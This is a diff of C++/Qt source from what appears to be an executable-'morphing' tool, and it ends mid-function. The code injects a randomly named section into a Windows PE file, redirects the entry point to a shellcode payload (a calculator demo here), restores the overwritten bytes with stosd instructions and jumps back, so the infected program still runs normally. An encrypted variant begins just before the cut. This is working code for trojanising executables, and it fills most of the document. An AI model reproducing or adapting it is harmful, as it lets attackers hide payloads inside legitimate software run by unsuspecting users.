@@ -39,6 +39,7 @@ Morph_Executable_Controller::Morph_Executable_Controller()
     this->text_section_buffer_original = nullptr;
     this->num_of_stosd = 0;
     this->buffer_cursor = 0;
+    this->start_of_payload_section_offset = 0;
 
 }
 
@@ -75,307 +76,6 @@ Morph_Executable_Controller::~Morph_Executable_Controller()
      this->cur_wind = nullptr;
      delete this->cur_wind;
 
-}
-
-QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_path)
-{
-    QString status = "";
-    //reading bytes of a exe file
-    status = read_file_into_vector(exe_file_path);
-    error_warning_message_box(status);
-
-    //get image dos header pointer
-    //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
-    this->dos_header_pointer = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);
-
-    //validate the image dos header must be equals to MZ(ASCII)
-    status = validate_image_dos_signature(dos_header_pointer);
-    error_warning_message_box(status);
-
-
-    // getting image_NT_header_cursor and setting exe_header_file_offset
-    // Here we are assuming that buffer has the same bytes as the original file
-    // so we need to get the exe_header_file_offset
-    // which is the value of the e_lfanew attribute in dos_header_pointer
-    this->image_NT_header_file_cursor = this->dos_header_pointer->e_lfanew;
-    this->exe_header_file_offset = this->image_NT_header_file_cursor;
-
-    // get the image_NT_header_ptr
-    // the offset is at e_lfanew which is stored in image_NT_header_file_cursor
-    this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,image_NT_header_file_cursor);
-
-    //validate the file PE signature must be equal to some dog shit
-    status = validate_PE_signature(image_NT_header_ptr);
-    error_warning_message_box(status);
-
-
-    printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
-    //increasing the number of sections to allocate memory for payload
-    this->image_NT_header_ptr->FileHeader.NumberOfSections += 1;
-    printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
-
-    //randomizing the new payload section name
-    const std::string payload_section_name = randomize_payload_section_name();
-
-
-     //this is the entry point when the pe file is loaded to virtual memory
-    //must add image base + the address of entry point
-    this->entry_point_of_text_section = this->image_NT_header_ptr->OptionalHeader.ImageBase + this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint;
-    printf("ImageBase : 0x%x\nLoaded Entry point : 0x%x\n", this->image_NT_header_ptr->OptionalHeader.ImageBase, this->entry_point_of_text_section);
-
-    //saving the file and section alignments in variables
-    this->file_alignment =this->image_NT_header_ptr->OptionalHeader.FileAlignment;
-    this->section_alignment = this->image_NT_header_ptr->OptionalHeader.SectionAlignment;
-
-    // This cursor will be used to cycle through each section in the pe file
-    // need to add exe file offset + the size of an IMAGE_NT_HEADERS32 struct to get to the first section
-    unsigned int section_header_cursor = exe_header_file_offset + sizeof(IMAGE_NT_HEADERS32);
-
-    //storing all image section headers inside a vector
-    store_image_section_headers_in_vec(buffer, image_section_header_vec,
-                                       image_NT_header_ptr, section_header_cursor);
-
-    //getting the index of the .text section inside the image_section_header_vec
-    status = get_section_header_index_by_name(TEXT_SECTION_NAME, image_section_header_vec,image_NT_header_ptr,index_of_text_section);
-    error_warning_message_box(status);
-
-    //getting the raw data offset of the .text section via image_section_header_vec
-    //note that the above function saved the index of the .text section
-    this->text_section_raw_data_offset = this->image_section_header_vec[this->index_of_text_section]->PointerToRawData;
-
-    //storing the whole .text section inside the text_section_header_ptr
-    this->text_section_header_ptr = this->image_section_header_vec[this->index_of_text_section];
-
-    //getting the raw data size of the .text section via text_section_header_ptr
-    this->size_of_text_section = this->text_section_header_ptr->SizeOfRawData;
-
-    //setting the characteristics to read/write/execute
-    this->text_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;
-
-    //setting the payload section name from payload_section_name (randomized earlier),
-    //which is at the end of the image_section_header_vec
-    set_new_section_name(this->image_section_header_vec[this->image_section_header_vec.size()-1],
-                           payload_section_name);
-
-
-    //getting the index of the .payload section inside the image_section_header_vec
-    status = get_section_header_index_by_name(payload_section_name, image_section_header_vec,
-                                              image_NT_header_ptr,index_of_payload_section);
-    error_warning_message_box(status);
-
-    //storing the whole .payload section inside the payload_section_header_ptr
-    this->payload_section_header_ptr = image_section_header_vec[index_of_payload_section];
-
-    //gets the index corresponding to the radio button
-    int chosen_payload_index = get_payload_radio_button();
-
-
-    switch(chosen_payload_index)
-    {
-        case 0:
-            set_morphed_exe_name(exe_file_path,"_CALC");
-            this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
-            populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
-            break;
-
-        default:
-            break;
-    }
-
-    //setting the full file path
-    set_morphed_exe_file_path(exe_file_path);
-
-    //calculate the file alignment factor to align the section
-    calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);
-
-    //calculate the payload raw data size via file_alignment
-    this->payload_raw_data_size = this->file_alignment_factor * this->file_alignment;
-
-    //calculate the section alignment factor for the section
-    //needs the virtual size of the section before the payload section for calculation
-    calculate_section_alignment_factor(payload_num_of_bytes,section_alignment,section_alignment_factor,
-                                       image_section_header_vec[index_of_payload_section-1]);
-
-    //calculate payloads virtual size via section alignment
-    this->payload_virtual_size = this->section_alignment_factor * this->section_alignment;
-
-    //calculate payloads raw address
-    //previous raw size + previous raw data offset
-    this->payload_raw_address = image_section_header_vec[index_of_payload_section-1]->SizeOfRawData
-                                + image_section_header_vec[index_of_payload_section-1]->PointerToRawData;
-
-    //calculate the payloads va
-    //previous virtual address + payloads virtual size
-    this->payload_virtual_address = image_section_header_vec[index_of_payload_section-1]->VirtualAddress
-                                    + this->payload_virtual_size;
-
-    //setting the relevant values in the new payload section header via payload_section_header_ptr
-    init_payload_section_header(this->payload_section_header_ptr,
-                                this->payload_raw_address,
-                                this->payload_raw_data_size,
-                                this->payload_virtual_address,
-                                this->payload_virtual_size,
-                                this->SECTIONCHARACTERISTICSTOSET);
-
-    //setting the new size of the pe file
-    //via image_NT_header_ptr by adding on the payload_virtual_size
-    this->image_NT_header_ptr->OptionalHeader.SizeOfImage += this->payload_virtual_size;
-
-    //this is the section pivot gadget for the payload section,
-    //which is used to patch back the .text section
-    //currently this value is when the PE is loaded, hence we add the raw data offset of the text section
-    this->starting_of_text_section_offset_on_load = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
-                                    this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
-                                    this->text_section_raw_data_offset;
-
-    //getting image base via image_NT_header_ptr optional header
-    this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;
-
-    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string
-    std::string jump_to_payload_asm = "mov ecx, ";
-    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->image_base + this->payload_virtual_address) + ";";
-    jump_to_payload_asm += "jmp ecx;";
-    this->machine_code_vec.clear(); //clear vector to input new machine code
-
-    //and converting assembly syntax into machine code
-    status = asm_to_machine_code(jump_to_payload_asm,this->machine_code_vec,this->machine_code_num_of_bytes);
-    error_warning_message_box(status);
-
-    //storing the byte length of the section pivot gadget
-    this->jump_to_payload_byte_length = this->machine_code_num_of_bytes;
-
-    //putting original text section data into a pointer, to be added into the buffer later
-    this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
-                                                                      this->text_section_raw_data_offset,
-                                                                      this->size_of_text_section);
-    //storing the original text section into a pointer, for calculation
-    this->text_section_buffer_ptr = this->text_section_buffer_original;
-
-
-    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
-    //will be used to put into the actual buffer later
-    //starting_of_text_section_offset_on_load must subtract by the text_section_raw_data_offset
-    //to get to the physical memory of the buffer
-    editing_text_section_ptr(this->text_section_buffer_ptr,
-                             this->jump_to_payload_byte_length,
-                             this->starting_of_text_section_offset_on_load - this->text_section_raw_data_offset,
-                             this->machine_code_vec);
-
-	//populate_section_ptr(text_section_buffer_ptr, reinterpret_cast<char*>(machine_code_vec.data()), jump_to_payload_byte_length);
-
-    //here we memorize the original bytes of the text section
-    //this will be used in the payload section to patch back the overwritten text section bytes
-    std::string text_section_memorized_entry_bytes = "";
-
-    //stosd can only store a certain amount of dwords
-    //this is to calculate how many stosd we need
-    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
-    calculate_num_of_stosd_for_patching(text_section_memorized_entry_bytes,
-                                        this->num_of_stosd,
-                                        this->jump_to_payload_byte_length,
-                                        this->starting_of_text_section_offset_on_load,
-                                        this->buffer);
-
-
-
-    //getting the stosd instructions asm, afew calculations must be done for big to little endian conversion
-    std::string patching_entry_bytes_asm = "";
-    get_stosd_instruction_asm(patching_entry_bytes_asm,
-                              text_section_memorized_entry_bytes,
-                              this->num_of_stosd);
-
-    //converting patching_entry_bytes_asm to machine code
-    machine_code_vec.clear();
-    asm_to_machine_code(patching_entry_bytes_asm,machine_code_vec,this->machine_code_num_of_bytes);
-
-    //stores the payload into a variable char* and the ptr is to do calculation
-    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
-    char *payload_section_buffer_ptr = payload_section_buffer_original;
-
-    //writing the machine code into payload_section_buffer_ptr
-    //this will be used later to write back to the buffer
-    populate_section_ptr(payload_section_buffer_ptr,
-                                reinterpret_cast<char*>(this->machine_code_vec.data()),
-                                this->machine_code_num_of_bytes);
-
-    //putting in the payload into payload_section_buffer_ptr
-    populate_section_ptr(payload_section_buffer_ptr,
-                         reinterpret_cast<char*>(this->payload_vec.data()),
-                         this->payload_num_of_bytes);
-
-    //getting the asm instructions to jump back to the text section
-    std::string jump_back_to_text_section_asm = "";
-    get_jump_back_to_text_section_instruction_asm(jump_back_to_text_section_asm
-                                                  ,this->entry_point_of_text_section);
-
-    //converting the above asm instructions to machine code
-    machine_code_vec.clear();
-    asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
-                        this->machine_code_num_of_bytes);
-
-    //putting in the jump back to text section into payload_section_buffer_ptr
-    populate_section_ptr(payload_section_buffer_ptr,
-                         reinterpret_cast<char*>(this->machine_code_vec.data()),
-                         this->machine_code_num_of_bytes);
-
-
-
-    //===================================================================================
-    rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_pointer,
-                            this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
-    //replacing back the edited image_NT_header_ptr into the buffer
-    //number of sections was increased by 1
-    //new size of the pe file was set
-    //by adding the payload_virtual_size to SizeOfImage
-    this->buffer_cursor = this->exe_header_file_offset;
-    rewrite_bytes_to_buffer(this->buffer, (char*)this->image_NT_header_ptr,
-                            this->buffer_cursor,sizeof(IMAGE_NT_HEADERS32));
-
-    //need to be used to find the payload section later
-    unsigned int start_of_section_headers_offset = this->buffer_cursor + sizeof(IMAGE_NT_HEADERS32);
-
-    //need to add the cursor + the size of IMAGE_NT_HEADERS32 + the index_of_text_section * size of IMAGE_SECTION_HEADER
-    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER));
-    //this->buffer_cursor += this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER);
-    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_header_ptr,
-                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));
-
-    //putting in the new payload section header
-    //payload raw address is previous raw size + previous raw data offset
-    //payload raw data size was calculated via file_alignment
-    //payload virtual size is calculated via section alignment
-    //payload virtual address is previous virtual address + payloads virtual size
-    //payload characteristics is set to read/write/execute
-    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_payload_section * sizeof(IMAGE_SECTION_HEADER));
-    rewrite_bytes_to_buffer(this->buffer, (char*)this->payload_section_header_ptr,
-                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));
-
-    //need to resize buffer to accomodate the new payload section
-    __int64 new_buffer_size = this->buffer.size() + this->payload_raw_data_size;
-    this->buffer.resize(new_buffer_size);
-
-    //start at the payload_section_header_ptr pointer to raw data
-    //putting in the payload into buffer
-    this->buffer_cursor = this->payload_section_header_ptr->PointerToRawData;
-    rewrite_bytes_to_buffer(this->buffer, (char*)payload_section_buffer_original,
-                            this->buffer_cursor,this->payload_raw_data_size);
-
-    this->buffer_cursor = this->text_section_raw_data_offset;
-    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_buffer_original,
-                            this->buffer_cursor,this->size_of_text_section);
-
-
-     print_section_headers(image_section_header_vec);
-    //writing to file
-    write_exe_file(this->morphed_exe_file_path, this->buffer);
-    //free memory
-    delete[] payload_section_buffer_original;
-    payload_section_buffer_ptr = nullptr;
-    delete payload_section_buffer_ptr;
-
-    std::cout << std::endl;
-
-    return SUCCESS_MORPHED_EXECUTABLE;
 }
 
 //morphing section supporting/utility functions
@@ -766,6 +466,10 @@ void Morph_Executable_Controller::write_exe_file(QString morphed_exe_file_path, 
     saver.write_exe_file(morphed_exe_file_path,buffer);
 }
 
+void Morph_Executable_Controller::store_edi(std::string &store_payload_entry_point_in_edi_asm, DWORD entry_point_of_text_section)
+{
+    store_payload_entry_point_in_edi_asm = "mov edi, " + convert_num_to_hex<DWORD>(entry_point_of_text_section) + ";";
+}
 
 void Morph_Executable_Controller::error_warning_message_box(QString status)
 {
@@ -804,4 +508,640 @@ void Morph_Executable_Controller::error_warning_message_box(QString status)
         QMessageBox::warning(cur_wind, "Warning",
                              "Failed to assemble in keystone");
     }
+}
+
+QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_path)
+{
+    QString status = "";
+    //reading bytes of a exe file
+    status = read_file_into_vector(exe_file_path);
+    error_warning_message_box(status);
+
+    //get image dos header pointer
+    //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
+    this->dos_header_pointer = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);
+
+    //validate the image dos header must be equals to MZ(ASCII)
+    status = validate_image_dos_signature(dos_header_pointer);
+    error_warning_message_box(status);
+
+
+    // getting image_NT_header_cursor and setting exe_header_file_offset
+    // Here we are assuming that buffer has the same bytes as the original file
+    // so we need to get the exe_header_file_offset
+    // which is the value of the e_lfanew attribute in dos_header_pointer
+    this->image_NT_header_file_cursor = this->dos_header_pointer->e_lfanew;
+    this->exe_header_file_offset = this->image_NT_header_file_cursor;
+
+    // get the image_NT_header_ptr
+    // the offset is at e_lfanew which is stored in image_NT_header_file_cursor
+    this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,image_NT_header_file_cursor);
+
+    //validate the file PE signature must be equal to some dog shit
+    status = validate_PE_signature(image_NT_header_ptr);
+    error_warning_message_box(status);
+
+
+    printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
+    //increasing the number of sections to allocate memory for payload
+    this->image_NT_header_ptr->FileHeader.NumberOfSections += 1;
+    printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
+
+    //randomizing the new payload section name
+    const std::string payload_section_name = randomize_payload_section_name();
+
+
+     //this is the entry point when the pe file is loaded to virtual memory
+    //must add image base + the address of entry point
+    this->entry_point_of_text_section = this->image_NT_header_ptr->OptionalHeader.ImageBase + this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint;
+    printf("ImageBase : 0x%x\nLoaded Entry point : 0x%x\n", this->image_NT_header_ptr->OptionalHeader.ImageBase, this->entry_point_of_text_section);
+
+    //saving the file and section alignments in variables
+    this->file_alignment =this->image_NT_header_ptr->OptionalHeader.FileAlignment;
+    this->section_alignment = this->image_NT_header_ptr->OptionalHeader.SectionAlignment;
+
+    // This cursor will be used to cycle through each section in the pe file
+    // need to add exe file offset + the size of an IMAGE_NT_HEADERS32 struct to get to the first section
+    unsigned int section_header_cursor = exe_header_file_offset + sizeof(IMAGE_NT_HEADERS32);
+
+    //storing all image section headers inside a vector
+    store_image_section_headers_in_vec(buffer, image_section_header_vec,
+                                       image_NT_header_ptr, section_header_cursor);
+
+    //getting the index of the .text section inside the image_section_header_vec
+    status = get_section_header_index_by_name(TEXT_SECTION_NAME, image_section_header_vec,image_NT_header_ptr,index_of_text_section);
+    error_warning_message_box(status);
+
+    //getting the raw data offset of the .text section via image_section_header_vec
+    //note that the above function saved the index of the .text section
+    this->text_section_raw_data_offset = this->image_section_header_vec[this->index_of_text_section]->PointerToRawData;
+
+    //storing the whole .text section inside the text_section_header_ptr
+    this->text_section_header_ptr = this->image_section_header_vec[this->index_of_text_section];
+
+    //getting the raw data size of the .text section via text_section_header_ptr
+    this->size_of_text_section = this->text_section_header_ptr->SizeOfRawData;
+
+    //setting the characteristics to read/write/execute
+    this->text_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;
+
+    //setting the payload section name from payload_section_name (randomized earlier),
+    //which is at the end of the image_section_header_vec
+    set_new_section_name(this->image_section_header_vec[this->image_section_header_vec.size()-1],
+                           payload_section_name);
+
+
+    //getting the index of the .payload section inside the image_section_header_vec
+    status = get_section_header_index_by_name(payload_section_name, image_section_header_vec,
+                                              image_NT_header_ptr,index_of_payload_section);
+    error_warning_message_box(status);
+
+    //storing the whole .payload section inside the payload_section_header_ptr
+    this->payload_section_header_ptr = image_section_header_vec[index_of_payload_section];
+
+    //gets the index corresponding to the radio button
+    int chosen_payload_index = get_payload_radio_button();
+
+
+    switch(chosen_payload_index)
+    {
+        case 0:
+            set_morphed_exe_name(exe_file_path,"_CALC");
+            this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
+            break;
+
+        default:
+            break;
+    }
+
+    //setting the full file path
+    set_morphed_exe_file_path(exe_file_path);
+
+    //calculate the file alignment factor to align the section
+    calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);
+
+    //calculate the payload raw data size via file_alignment
+    this->payload_raw_data_size = this->file_alignment_factor * this->file_alignment;
+
+    //calculate the section alignment factor for the section
+    //needs the virtual size of the section before the payload section for calculation
+    calculate_section_alignment_factor(payload_num_of_bytes,section_alignment,section_alignment_factor,
+                                       image_section_header_vec[index_of_payload_section-1]);
+
+    //calculate payloads virtual size via section alignment
+    this->payload_virtual_size = this->section_alignment_factor * this->section_alignment;
+
+    //calculate payloads raw address
+    //previous raw size + previous raw data offset
+    this->payload_raw_address = image_section_header_vec[index_of_payload_section-1]->SizeOfRawData
+                                + image_section_header_vec[index_of_payload_section-1]->PointerToRawData;
+
+    //calculate the payloads va
+    //previous virtual address + payloads virtual size
+    this->payload_virtual_address = image_section_header_vec[index_of_payload_section-1]->VirtualAddress
+                                    + this->payload_virtual_size;
+
+    //setting the relevant values in the new payload section header via payload_section_header_ptr
+    init_payload_section_header(this->payload_section_header_ptr,
+                                this->payload_raw_address,
+                                this->payload_raw_data_size,
+                                this->payload_virtual_address,
+                                this->payload_virtual_size,
+                                this->SECTIONCHARACTERISTICSTOSET);
+
+    //setting the new size of the pe file
+    //via image_NT_header_ptr by adding on the payload_virtual_size
+    this->image_NT_header_ptr->OptionalHeader.SizeOfImage += this->payload_virtual_size;
+
+    //this is the section pivot gadget for the payload section,
+    //which is used to patch back the .text section
+    //currently this value is when the PE is loaded, hence we add the raw data offset of the text section
+    this->starting_of_text_section_offset_on_load = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
+                                    this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
+                                    this->text_section_raw_data_offset;
+
+    //getting image base via image_NT_header_ptr optional header
+    this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;
+
+    //getting the start of the payload section, which is image base + payload virtual size
+    this->start_of_payload_section_offset = this->image_base + this->payload_virtual_address;
+
+    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string
+    std::string jump_to_payload_asm = "mov ecx, ";
+    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->start_of_payload_section_offset) + ";";
+    jump_to_payload_asm += "jmp ecx;";
+    this->machine_code_vec.clear(); //clear vector to input new machine code
+
+    //and converting assembly syntax into machine code
+    status = asm_to_machine_code(jump_to_payload_asm,this->machine_code_vec,this->machine_code_num_of_bytes);
+    error_warning_message_box(status);
+
+    //storing the byte length of the section pivot gadget
+    this->jump_to_payload_byte_length = this->machine_code_num_of_bytes;
+
+    //putting original text section data into a pointer, to be added into the buffer later
+    this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
+                                                                      this->text_section_raw_data_offset,
+                                                                      this->size_of_text_section);
+    //storing the original text section into a pointer, for calculation
+    this->text_section_buffer_ptr = this->text_section_buffer_original;
+
+
+    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
+    //will be used to put into the actual buffer later
+    //starting_of_text_section_offset_on_load must subtract by the text_section_raw_data_offset
+    //to get to the physical memory of the buffer
+    editing_text_section_ptr(this->text_section_buffer_ptr,
+                             this->jump_to_payload_byte_length,
+                             this->starting_of_text_section_offset_on_load - this->text_section_raw_data_offset,
+                             this->machine_code_vec);
+
+
+    //stores the payload into a variable char* and the ptr is to do calculation
+    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
+    char *payload_section_buffer_ptr = payload_section_buffer_original;
+
+    //we need to store the payload entry point address into edi, so that stosd will work as intended
+    //safe practice, incase edi was used or modified previously
+    std::string store_payload_entry_point_in_edi_asm = "";
+    store_edi(store_payload_entry_point_in_edi_asm,this->entry_point_of_text_section);
+    this->machine_code_vec.clear();
+    asm_to_machine_code(store_payload_entry_point_in_edi_asm,
+                        this->machine_code_vec,this->machine_code_num_of_bytes);
+
+    populate_section_ptr(payload_section_buffer_ptr,
+                                reinterpret_cast<char*>(this->machine_code_vec.data()),
+                                this->machine_code_num_of_bytes);
+
+
+    //here we memorize the original bytes of the text section
+    //this will be used in the payload section to patch back the overwritten text section bytes
+    std::string text_section_memorized_entry_bytes = "";
+
+    //stosd can only store a certain amount of dwords
+    //this is to calculate how many stosd we need
+    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
+    calculate_num_of_stosd_for_patching(text_section_memorized_entry_bytes,
+                                        this->num_of_stosd,
+                                        this->jump_to_payload_byte_length,
+                                        this->starting_of_text_section_offset_on_load,
+                                        this->buffer);
+
+
+
+    //getting the stosd instructions asm, afew calculations must be done for big to little endian conversion
+    std::string patching_entry_bytes_asm = "";
+    get_stosd_instruction_asm(patching_entry_bytes_asm,
+                              text_section_memorized_entry_bytes,
+                              this->num_of_stosd);
+
+    //converting patching_entry_bytes_asm to machine code
+    this->machine_code_vec.clear();
+    asm_to_machine_code(patching_entry_bytes_asm,this->machine_code_vec,
+                        this->machine_code_num_of_bytes);
+
+
+    //writing the machine code into payload_section_buffer_ptr
+    //this will be used later to write back to the buffer
+    populate_section_ptr(payload_section_buffer_ptr,
+                                reinterpret_cast<char*>(this->machine_code_vec.data()),
+                                this->machine_code_num_of_bytes);
+
+    //putting in the payload into payload_section_buffer_ptr
+    populate_section_ptr(payload_section_buffer_ptr,
+                         reinterpret_cast<char*>(this->payload_vec.data()),
+                         this->payload_num_of_bytes);
+
+    //getting the asm instructions to jump back to the text section
+    std::string jump_back_to_text_section_asm = "";
+    get_jump_back_to_text_section_instruction_asm(jump_back_to_text_section_asm
+                                                  ,this->entry_point_of_text_section);
+
+    //converting the above asm instructions to machine code
+    machine_code_vec.clear();
+    asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
+                        this->machine_code_num_of_bytes);
+
+    //putting in the jump back to text section into payload_section_buffer_ptr
+    populate_section_ptr(payload_section_buffer_ptr,
+                         reinterpret_cast<char*>(this->machine_code_vec.data()),
+                         this->machine_code_num_of_bytes);
+
+
+
+    //===================================================================================
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_pointer,
+                            this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
+    //replacing back the edited image_NT_header_ptr into the buffer
+    //number of sections was increased by 1
+    //new size of the pe file was set
+    //by adding the payload_virtual_size to SizeOfImage
+    this->buffer_cursor = this->exe_header_file_offset;
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->image_NT_header_ptr,
+                            this->buffer_cursor,sizeof(IMAGE_NT_HEADERS32));
+
+    //need to be used to find the payload section later
+    unsigned int start_of_section_headers_offset = this->buffer_cursor + sizeof(IMAGE_NT_HEADERS32);
+
+    //need to add the cursor + the size of IMAGE_NT_HEADERS32 + the index_of_text_section * size of IMAGE_SECTION_HEADER
+    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER));
+    //this->buffer_cursor += this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER);
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_header_ptr,
+                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));
+
+    //putting in the new payload section header
+    //payload raw address is previous raw size + previous raw data offset
+    //payload raw data size was calculated via file_alignment
+    //payload virtual size is calculated via section alignment
+    //payload virtual address is previous virtual address + payloads virtual size
+    //payload characteristics is set to read/write/execute
+    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_payload_section * sizeof(IMAGE_SECTION_HEADER));
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->payload_section_header_ptr,
+                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));
+
+    //need to resize buffer to accomodate the new payload section
+    __int64 new_buffer_size = this->buffer.size() + this->payload_raw_data_size;
+    this->buffer.resize(new_buffer_size);
+
+    //start at the payload_section_header_ptr pointer to raw data
+    //putting in the payload into buffer
+    this->buffer_cursor = this->payload_section_header_ptr->PointerToRawData;
+    rewrite_bytes_to_buffer(this->buffer, (char*)payload_section_buffer_original,
+                            this->buffer_cursor,this->payload_raw_data_size);
+
+    this->buffer_cursor = this->text_section_raw_data_offset;
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_buffer_original,
+                            this->buffer_cursor,this->size_of_text_section);
+
+
+     print_section_headers(image_section_header_vec);
+    //writing to file
+    write_exe_file(this->morphed_exe_file_path, this->buffer);
+    //free memory
+    delete[] payload_section_buffer_original;
+    payload_section_buffer_ptr = nullptr;
+    delete payload_section_buffer_ptr;
+
+    std::cout << std::endl;
+
+    return SUCCESS_MORPHED_EXECUTABLE;
+}
+
+QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_path)
+{
+    QString status = "";
+    //reading bytes of a exe file
+    status = read_file_into_vector(exe_file_path);
+    error_warning_message_box(status);
+
+    //get image dos header pointer
+    //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
+    this->dos_header_pointer = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);
+
+    //validate the image dos header must be equals to MZ(ASCII)
+    status = validate_image_dos_signature(dos_header_pointer);
+    error_warning_message_box(status);
+
+
+    // getting image_NT_header_cursor and setting exe_header_file_offset
+    // Here we are assuming that buffer has the same bytes as the original file
+    // so we need to get the exe_header_file_offset
+    // which is the value of the e_lfanew attribute in dos_header_pointer
+    this->image_NT_header_file_cursor = this->dos_header_pointer->e_lfanew;
+    this->exe_header_file_offset = this->image_NT_header_file_cursor;
+
+    // get the image_NT_header_ptr
+    // the offset is at e_lfanew which is stored in image_NT_header_file_cursor
+    this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,image_NT_header_file_cursor);
+
+    //validate the file PE signature must be equal to some dog shit
+    status = validate_PE_signature(image_NT_header_ptr);
+    error_warning_message_box(status);
+
+
+    printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
+    //increasing the number of sections to allocate memory for payload
+    this->image_NT_header_ptr->FileHeader.NumberOfSections += 1;
+    printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
+
+    //randomizing the new payload section name
+    const std::string payload_section_name = randomize_payload_section_name();
+
+
+     //this is the entry point when the pe file is loaded to virtual memory
+    //must add image base + the address of entry point
+    this->entry_point_of_text_section = this->image_NT_header_ptr->OptionalHeader.ImageBase + this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint;
+    printf("ImageBase : 0x%x\nLoaded Entry point : 0x%x\n", this->image_NT_header_ptr->OptionalHeader.ImageBase, this->entry_point_of_text_section);
+
+    //saving the file and section alignments in variables
+    this->file_alignment =this->image_NT_header_ptr->OptionalHeader.FileAlignment;
+    this->section_alignment = this->image_NT_header_ptr->OptionalHeader.SectionAlignment;
+
+    // This cursor will be used to cycle through each section in the pe file
+    // need to add exe file offset + the size of an IMAGE_NT_HEADERS32 struct to get to the first section
+    unsigned int section_header_cursor = exe_header_file_offset + sizeof(IMAGE_NT_HEADERS32);
+
+    //storing all image section headers inside a vector
+    store_image_section_headers_in_vec(buffer, image_section_header_vec,
+                                       image_NT_header_ptr, section_header_cursor);
+
+    //getting the index of the .text section inside the image_section_header_vec
+    status = get_section_header_index_by_name(TEXT_SECTION_NAME, image_section_header_vec,image_NT_header_ptr,index_of_text_section);
+    error_warning_message_box(status);
+
+    //getting the raw data offset of the .text section via image_section_header_vec
+    //note that the above function saved the index of the .text section
+    this->text_section_raw_data_offset = this->image_section_header_vec[this->index_of_text_section]->PointerToRawData;
+
+    //storing the whole .text section inside the text_section_header_ptr
+    this->text_section_header_ptr = this->image_section_header_vec[this->index_of_text_section];
+
+    //getting the raw data size of the .text section via text_section_header_ptr
+    this->size_of_text_section = this->text_section_header_ptr->SizeOfRawData;
+
+    //setting the characteristics to read/write/execute
+    this->text_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;
+
+    //setting the payload section name from payload_section_name (randomized earlier),
+    //which is at the end of the image_section_header_vec
+    set_new_section_name(this->image_section_header_vec[this->image_section_header_vec.size()-1],
+                           payload_section_name);
+
+
+    //getting the index of the .payload section inside the image_section_header_vec
+    status = get_section_header_index_by_name(payload_section_name, image_section_header_vec,
